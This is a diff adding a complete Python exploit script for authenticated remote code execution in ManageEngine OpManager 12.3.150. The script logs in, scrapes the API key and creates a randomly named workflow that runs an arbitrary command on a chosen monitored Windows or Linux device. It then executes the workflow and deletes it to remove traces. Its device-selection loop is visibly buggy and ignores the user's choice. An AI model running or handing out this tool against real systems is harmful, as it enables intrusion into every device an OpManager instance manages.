@@ -1,0 +1,266 @@
+#!/usr/bin/env python3
+
+# Exploit Title: ManageEngine opManager Authenticated Code Execution
+# Google Dork: N/A
+# Date: 08/13/2019
+# Exploit Author: @kindredsec
+# Vendor Homepage: https://www.manageengine.com/
+# Software Link: https://www.manageengine.com/network-monitoring/download.html
+# Version: 12.3.150
+# Tested on: Windows Server 2016
+# CVE: N/A
+
+import requests
+import re
+import random
+import sys
+import json
+import string
+import argparse
+
+C_WHITE = '\033[1;37m'
+C_BLUE = '\033[1;34m'
+C_GREEN = '\033[1;32m'
+C_YELLOW = '\033[1;33m'
+C_RED = '\033[1;31m'
+C_RESET = '\033[0m'
+LOGIN_FAIL_MSG = "Invalid username and/or password."
+
+def buildRandomString(length=10):
+	letters = string.ascii_lowercase
+	return ''.join(random.choice(letters) for i in range(length))
+
+
+def getSessionData(target, user, password):
+
+	session = requests.Session()
+	session.get(target)
+
+	# Login Sequence
+	randSid = random.uniform(-1,1)
+	getParams = { "requestType" : "AJAX" , "sid" : str(randSid) }
+	postData = { "eraseAutoLoginCookie" : "true" }
+	session.post( url = target + "/servlets/SettingsServlet", data = postData, params = getParams )
+
+	postData = { "loginFromCookieData" : "false",
+						 "ntlmv2" : "false", 
+						 "j_username" : user,
+						 "j_password" : password 
+						}
+	initialAuth = session.post( url = target + "/j_security_check", data = postData ) 
+
+
+	if LOGIN_FAIL_MSG in initialAuth.text:
+
+		print(f"{C_RED}[-]{C_RESET} Invalid credentials specified! Could not login to OpManager.")
+		sys.exit(1)
+
+	elif initialAuth.status_code != 200:
+		print(f"{C_RED}[-]{C_RESET} An Unknown Error has occurred during the authentication process.")
+		sys.exit(1)
+
+	apiKeyReg = re.search(".*\.apiKey = .*;", initialAuth.text)
+	apiKey = apiKeyReg.group(0).split('"')[1]
+
+	return { "session" : session , "apiKey" : apiKey }
+
+
+
+
+def getDeviceList(target, session, apiKey):
+
+	deviceList = session.get( target + "/api/json/v2/device/listDevices" , params = { "apiKey" : apiKey } )
+
+	devices = {}
+	devicesJsonParsed = json.loads(deviceList.text)
+	for row in devicesJsonParsed["rows"]:
+		devices[row["deviceName"]] = [ row["ipaddress"], row["type"] ]
+
+	return devices
+
+
+
+def buildTaskWindows(target, session, apiKey, device, command):
+
+	# Build Task
+	taskName = buildRandomString()
+	workFlowName = buildRandomString(15)
+
+	jsonData = """{"taskProps":{"mainTask":{"taskID":9,"dialogId":3,"name":"""
+	jsonData += '"' + taskName + '"'
+	jsonData += ""","deviceDisplayName":"${DeviceName}","cmdLine":"cmd.exe /c ${FileName}.bat ${DeviceName} ${UserName} ${Password} arg1","scriptBody":""" 
+	jsonData += '"' + command + '"'
+	jsonData +=  ""","workingDir":"${UserHomeDir}","timeout":"60","associationID":-1,"x":41,"y":132},"name":"Untitled","description":""},"triggerProps":{"workflowDetails":{"wfID":"","wfName":"""
+	jsonData += '"' + workFlowName + '"' 
+	jsonData += ""","wfDescription":"Thnx for Exec","triggerType":"0"},"selectedDevices":["""
+	jsonData += '"' +  device + '"' 
+	jsonData += """],"scheduleDetails":{"schedType":"1","selTab":"1","onceDate":"2999-08-14","onceHour":"0","onceMin":"0","dailyHour":"0","dailyMin":"0","dailyStartDate":"2019-08-14","weeklyDay":[],"wee"""
+	jsonData += """klyHour":"0","weeklyMin":"0","monthlyType":"5","monthlyWeekNum":"1","monthlyDay":["1"],"monthlyHour":"0","monthlyMin":"0","yearlyMonth":["0"],"yearlyDate":"1","yearlyHour":"0","y"""
+	jsonData += """earlyMin":"0"},"criteriaDetails":{}}}"""
+
+	makeWorkFlow = session.post(url = target + "/api/json/workflow/addWorkflow", params = { "apiKey" : apiKey }, data = { "jsonData" : jsonData })
+
+	if "has been created successfully" in makeWorkFlow.text:
+		print(f"{C_GREEN}[+]{C_RESET} Successfully created Workflow")
+	else:
+		print(f"{C_RED}[-]{C_RESET} Issues creating workflow. Exiting . . .")
+		sys.exit(1)
+
+	return workFlowName
+
+
+def buildTaskLinux(target, session, apiKey, device, command):
+
+	taskName = buildRandomString()
+	workFlowName = buildRandomString(15)
+
+	jsonData = """{"taskProps":{"mainTask":{"taskID":9,"dialogId":3,"name":"""
+	jsonData += '"' + taskName + '"'
+	jsonData += ""","deviceDisplayName":"${DeviceName}","cmdLine":"sh ${FileName} ${DeviceName} arg1","scriptBody":""" 
+	jsonData += '"' + command + '"'
+	jsonData +=  ""","workingDir":"${UserHomeDir}","timeout":"60","associationID":-1,"x":41,"y":132},"name":"Untitled","description":""},"triggerProps":{"workflowDetails":{"wfID":"","wfName":"""
+	jsonData += '"' + workFlowName + '"' 
+	jsonData += ""","wfDescription":"Thnx for Exec","triggerType":"0"},"selectedDevices":["""
+	jsonData += '"' +  device + '"' 
+	jsonData += """],"scheduleDetails":{"schedType":"1","selTab":"1","onceDate":"2999-08-14","onceHour":"0","onceMin":"0","dailyHour":"0","dailyMin":"0","dailyStartDate":"2019-08-14","weeklyDay":[],"wee"""
+	jsonData += """klyHour":"0","weeklyMin":"0","monthlyType":"5","monthlyWeekNum":"1","monthlyDay":["1"],"monthlyHour":"0","monthlyMin":"0","yearlyMonth":["0"],"yearlyDate":"1","yearlyHour":"0","y"""
+	jsonData += """earlyMin":"0"},"criteriaDetails":{}}}"""
+
+	makeWorkFlow = session.post(url = target + "/api/json/workflow/addWorkflow", params = { "apiKey" : apiKey }, data = { "jsonData" : jsonData })
+
+	if "has been created successfully" in makeWorkFlow.text:
+		print(f"{C_GREEN}[+]{C_RESET} Successfully created Workflow")
+	else:
+		print(f"{C_RED}[-]{C_RESET} Issues creating workflow. Exiting . . .")
+		sys.exit(1)
+
+	return workFlowName
+
+
+# Get the ID of the newly created workflow
+def getWorkflowID(target, session, apiKey, workflowName):
+
+	getID = session.get(url = target + "/api/json/workflow/getWorkflowList", params = { "apiKey" : apiKey })
+
+	rbID = -100
+	workflowJsonParsed = json.loads(getID.text)
+	for wf in workflowJsonParsed:
+		if wf['name'] == workflowName:
+			rbID = wf['rbID'] 
+
+	if rbID == -100: 
+		print(f"{C_RED}[-]{C_RESET} Issue obtaining Workflow ID. Exiting ...")
+		sys.exit(1)
+
+	return rbID
+
+
+def getDeviceID(target, session, apiKey, rbID, device):
+
+	getDevices = session.get(url = target + "/api/json/workflow/showDevicesForWorkflow", params = { "apiKey" : apiKey , "wfID" : rbID })
+	wfDevicesJsonParsed = json.loads(getDevices.text)
+	wfDevices = wfDevicesJsonParsed["defaultDevices"]
+	deviceID = list(wfDevices.keys())[0]
+
+	return deviceID
+
+
+
+def runWorkflow(target, session, apiKey, rbID, device):
+
+	targetDeviceID = getDeviceID(target, session, apiKey, rbID, device)
+	
+	print(f"{C_YELLOW}[!]{C_RESET} Executing Code . . .")
+	workflowExec = session.post(target + "/api/json/workflow/executeWorkflow", params = { "apiKey" : apiKey }, data = { "wfID" : rbID, "deviceName" : targetDeviceID, "triggerType" : 0 }	)
+
+	if re.match(r"^\[.*\]$", workflowExec.text.strip()):
+		print(f"{C_GREEN}[+]{C_RESET} Code appears to have run successfully!")
+	else:
+		print(f"{C_RED}[-]{C_RESET} Unknown error has occurred. Please try again or run the process manually.")
+		sys.exit(1)
+
+	deleteWorkflow(target, session, apiKey, rbID)
+	print(f"{C_GREEN}[+]{C_RESET} Exploit complete!")
+
+
+def deleteWorkflow(target, session, apiKey, rbID):
+	
+	print(f"{C_YELLOW}[!]{C_RESET} Cleaning up . . .")
+	delWorkFlow = session.post( target + "/api/json/workflow/deleteWorkflow" , params = { "apiKey" : apiKey, "wfID" : rbID })
+
+
+def main():
+
+	parser = argparse.ArgumentParser(description="Utilizes OpManager's Workflow feature to execute commands on any monitored device.")
+	parser.add_argument("-t", nargs='?', metavar="target", help="The full base URL of the OpManager Instance (Example: http://192.168.1.1)")
+	parser.add_argument("-u", nargs='?', metavar="user", help="The username of a valid OpManager admin account.")
+	parser.add_argument("-p", nargs='?', metavar="password", help="The password of a valid OpManager admin account.")
+	parser.add_argument("-c", nargs='?', metavar="command", help="The command you want to run.")
+
+	args = parser.parse_args()
+	
+	insufficient_args = False
+	if not args.u:
+		print(f"{C_RED}[-]{C_RESET} Please specify a username with '-t'.")
+		insufficient_args = True
+	if not args.t:
+		print(f"{C_RED}[-]{C_RESET} Please specify a target with '-t'.")
+		insufficient_args = True
+	if not args.p:
+		print(f"{C_RED}[-]{C_RESET} Please specify a password with '-p'.")
+		insufficient_args = True
+	if not args.c:
+		print(f"{C_RED}[-]{C_RESET} Please specify a command with '-c'.")
+		insufficient_args = True
+
+	if insufficient_args:
+		sys.exit(1)
+
+	
+	sessionDat = getSessionData(args.t, args.u, args.p)
+	session = sessionDat["session"]
+	apiKey = sessionDat["apiKey"]
+
+	devices = getDeviceList(args.t, session, apiKey)
+
+	# if there's only one device in the OpManager instance, default to running commands on that device;
+	# no need to ask the user.
+	if len(devices.keys()) == 1:
+		device = list(devices.keys())[0]
+	else:
+		print(f"{C_YELLOW}[!]{C_RESET} There appears to be multiple Devices within this target OpManager Instance:")
+		print("")
+		counter = 1
+		for key in devices.keys():
+			print(f"   {counter}: {key} ({devices[key][0]}) ({devices[key][1]})")
+
+		print("")
+		while True:
+			try:
+				prompt = f"{C_BLUE}[?]{C_RESET} Please specify which Device you want to run your command on: "
+				devSelect = int(input(prompt))
+			except KeyboardInterrupt:
+				sys.exit(1)
+			except ValueError:
+				print(f"{C_RED}[-]{C_RESET} Error. Invalid Device number selected. Quitting . . .")
+				sys.exit(1)
+	
+			if devSelect < 1 or devSelect > len(list(devices.keys())):
+				print(f"{C_RED}[-]{C_RESET} Error. Invalid Device number selected. Quitting . . .")
+				sys.exit(1)
+
+			else:
+				device = list(devices.keys())[counter - 1]
+				break
+
+	# don't hate, it works doesn't it?
+	if "indows" in devices[device][1]:
+		workflowName = buildTaskWindows(args.t, session, apiKey, device, args.c)
+	else:
+		workflowName = buildTaskLinux(args.t, session, apiKey, device, args.c)
+
+	workflowID =  getWorkflowID(args.t, session, apiKey, workflowName)
+	runWorkflow(args.t, session, apiKey, workflowID, device)
+	
+	
+main()
